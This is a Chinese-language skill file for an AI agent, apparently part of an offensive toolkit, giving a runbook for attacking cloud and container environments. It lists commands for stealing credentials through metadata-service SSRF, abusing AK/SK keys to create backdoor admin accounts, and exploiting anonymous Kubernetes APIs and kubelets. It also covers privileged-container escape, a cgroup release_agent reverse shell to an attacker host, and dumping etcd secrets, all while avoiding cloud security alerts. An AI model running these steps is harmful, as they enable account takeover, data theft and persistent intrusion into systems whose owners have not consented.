---
name: cloud-container-attack
description: 云与容器攻击：云凭据滥用（AK/SK接管）、元数据服务SSRF、K8s攻击面（匿名API/kubelet/exec到node）、Docker逃逸、Serverless与对象存储横向
whenToUse: 目标有云上资产（阿里云/腾讯云/AWS）；拿到云凭据或Pod内shell；需要跨可用区横向或接管控制台
role: internal
enabled: true
---

# 云与容器攻击

入口通常是**一把凭据**或**一个Pod**。**红线:接管控制台/跨账号横向成功一次**。

## 一、云凭据滥用(AK/SK)

```bash
# 找凭据:代码仓库(.env/配置)、进程环境变量、~/.aws/credentials、~/.aliyun/config.json
# 元数据服务(SSRF 落点,云主机自身):
curl 100.100.100.200/latest/meta-data/            # 阿里云
curl 169.254.169.254/latest/meta-data/iam/        # AWS(新版本要 token,IMDSv2)
# SSRF 打元数据 → 拿临时凭据 → 云 CLI 全控
aliyun configure set --access-key-id AKxxx --access-key-secret SKxxx
aws configure set aws_access_key_id ...           # 然后枚举一切
```
- 拿到凭据先枚举权限:`aliyun ram ListUsers` / `aws sts get-caller-identity` + iam simulate
- 高危动作:创建子账号/绑定管理员策略(留后门)、读 OSS/Bucket 全量、拉 RDS 快照

## 二、对象存储横向

```bash
# Bucket 枚举与接管
ossutil ls oss://corp-backup/                     # 凭据在手
# 公开 Bucket 直接读;接管(接管=注册同名的已删 bucket)
```

## 三、K8s 攻击面

```bash
# 匿名/弱授权 API
curl -k https://<api>:6443/version                 # 匿名可访问?
curl -k https://<api>:6443/api/v1/nodes            # 200 = 完蛋
# 拿到 token 后:
kubectl --server=https://<api> --token=<t> get pods -A
kubectl exec -it pod -n kube-system -- sh          # 到 node 上(特权 Pod)
# kubelet 只读口 10255 / Exec 10250
curl -k https://<node>:10250/pods
```
- **Pod 内起点**:`cat /var/run/secrets/kubernetes.io/serviceaccount/token` → 服务账号权限枚举
- 提权路径:创建特权 Pod → hostPath 挂载宿主 → 逃逸(见下)

## 四、Docker/K8s 逃逸

```bash
# 判断容器环境
cat /proc/1/cgroup | grep -q docker && echo container
ls /.dockerenv
# 特权容器逃逸
fdisk -l; mkdir /host && mount /dev/vda1 /host     # 直接挂宿主盘
chroot /host sh                                    # 宿主 root
# cgroup release_agent
echo 1 > /tmp/c/notify_on_release
echo "#!/bin/sh" > /cmd; echo "bash -i >& /dev/tcp/<vps>/443 0>&1" >> /cmd
echo "/cmd" > /tmp/c/release_agent
# runC CVE-2024-21626(FD 泄漏,WORKDIR=/proc/self/fd/N 竞态)
# hostPath 可写 + node kubelet 凭据 → 直接控制 node
```

## 五、Serverless / 中间件

```bash
# 函数计算:环境变量里常有更高权限凭据
env | grep -i key
# Redis(云上裸奔):写 crontab 反弹 / 主从复制 RCE(redis-rogue-server)
# etcd 2379 无认证:直接读全部 secret
etcdctl --endpoints=http://<ip>:2379 get / --prefix --keys-only | head
```

## 红线(完成判定)
- 控制台接管:以攻击者凭据登录成功并截图字段
- 或逃逸成功:容器外 whoami 为宿主 root / 拿到 node shell
- 云上动作最小化(只拿证据),避免触发云安全中心(记录是否触发)

## 衔接
- 容器逃逸后的系统层 → privesc-workshop
- 凭据爆破面 → credential-attack
- 长控建立 → c2-persistence
